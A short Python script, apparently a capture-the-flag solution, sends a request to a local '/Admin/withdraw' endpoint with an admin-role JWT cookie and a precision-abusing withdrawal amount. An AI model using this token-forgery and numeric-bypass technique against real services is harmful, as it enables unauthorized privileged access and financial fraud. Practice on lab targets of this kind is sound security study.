import asyncio
import aiohttp
import requests

url = "http://localhost:8000/Admin/withdraw"

cookie = {
    "jwt": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgImlhdCI6IDE3NDc5Mjc4MjV9._FaDd8rgh9fOC7E69Hxx3mN0aBVXGLj_9cFsJVbvCcU"
}

param = {
    'money': "0." + "0" * 100 + "1"
}

result=requests.get(url,cookies=cookie,params=param)
print(result.text)